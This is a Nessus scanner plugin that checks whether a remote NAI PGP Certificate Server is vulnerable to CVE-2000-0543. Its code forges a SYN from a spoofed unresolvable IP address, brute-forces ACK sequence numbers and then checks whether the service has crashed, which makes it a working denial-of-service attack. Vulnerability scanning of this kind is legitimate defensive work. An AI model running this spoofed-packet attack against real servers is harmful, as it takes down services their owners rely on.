#
# This script was written by John Lampe (j_lampe@bellsouth.net)
#

# See the Nessus Scripts License for details

# Changes by Tenable:
# - misc changes [RD]
# - Revised plugin title (6/25/09)


include("compat.inc");

if(description)
{
  script_id(10442);
  script_version("1.27");
  script_set_attribute(attribute:"plugin_modification_date", value: "2020/10/07");

  script_cve_id("CVE-2000-0543");
  script_bugtraq_id(1343);

  script_name(english:"NAI PGP Certificate Server Unresolvable IP DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote service is vulnerable to a denial of service." );
  script_set_attribute(attribute:"description", value:
"It was possible to make the remote PGP Cert Server
crash by spoofing a TCP connection that seems to
come from an unresolvable IP address.

An attacker may use this flaw to prevent your PGP 
certificate server from working properly." );
  script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2000-0543");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value: "2000/06/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2000/06/14");
  script_set_attribute(attribute:"plugin_publication_date", value: "2000/06/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:pgp:certificate_server");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"(C) 2000-2020 John Lampe <j_lampe@bellsouth.net>");

  script_require_ports(4000);
  exit(0);
}

#
# The script code starts here
if ( TARGET_IS_IPV6 ) exit(0);
if(!get_port_state(4000))exit(0);

soc = open_sock_tcp(4000);
if(!soc)exit(0);
close(soc);

# Get a sequence number from the target
dstaddr=get_host_ip();
srcaddr=compat::this_host();
IPH = 20;
IP_LEN = IPH;

ip = forge_ip_packet(   ip_v : 4,
                        ip_hl : 5,
                        ip_tos : 0,
                        ip_len : IP_LEN,
                        ip_id : 0xABA,
                        ip_p : IPPROTO_TCP,
                        ip_ttl : 255,
                        ip_off : 0,
                        ip_src : srcaddr);

port = get_host_open_port();
if(!port)port = 139;

tcpip = forge_tcp_packet(    ip       : ip,
                             th_sport : port,
                             th_dport : port,
                             th_flags : TH_SYN,
                             th_seq   : 0xF1C,
                             th_ack   : 0,
                             th_x2    : 0,
                             th_off   : 5,
                             th_win   : 512,
                             th_urp   : 0);

filter = 'tcp and (src host ' + dstaddr + ' and dst host ' + srcaddr + ' and dst port ' + port + ')';
result = send_packet(tcpip, pcap_active:TRUE, pcap_filter:filter);
if (result)  {
  tcp_seq = get_tcp_element(tcp:result, element:'th_seq');
}

#now spoof Funky IP with guessed sequence numbers

#packet 1.....SPOOF SYN
IPH = 20;
IP_LEN = IPH;
newsrcaddr = 10.187.76.12;
port = 4000;

ip2 = forge_ip_packet(   ip_v : 4,
                        ip_hl : 5,
                        ip_tos : 0,
                        ip_len : IP_LEN,
                        ip_id : 0xABA,
                        ip_p : IPPROTO_TCP,
                        ip_ttl : 255,
                        ip_off : 0,
                        ip_src : newsrcaddr);

tcpip = forge_tcp_packet(    ip       : ip2,
                             th_sport : 5555,
                             th_dport : port,
                             th_flags : TH_SYN,
                             th_seq   : 0xF1C,
                             th_ack   : 0,
                             th_x2    : 0,
                             th_off   : 5,
                             th_win   : 512,
                             th_urp   : 0);

result = send_packet(tcpip,pcap_active:FALSE);

# SPOOF SYN/ACK (brute guess next sequence number)
for (j=tcp_seq+1; j < tcp_seq + 25; j=j+1) {
  tcpip = forge_tcp_packet(    ip       : ip2,
                               th_sport : 5555,
                               th_dport : port,
                               th_flags : TH_ACK,
                               th_seq   : 0xF1D,
                               th_ack   : j,
                               th_x2    : 0,
                               th_off   : 5,
                               th_win   : 512,
                               th_urp   : 0);


  send_packet(tcpip,pcap_active:FALSE);
}

sleep(15);
if (service_is_dead(port: 4000) > 0)
  security_report_v4(port:port, severity:SECURITY_WARNING);
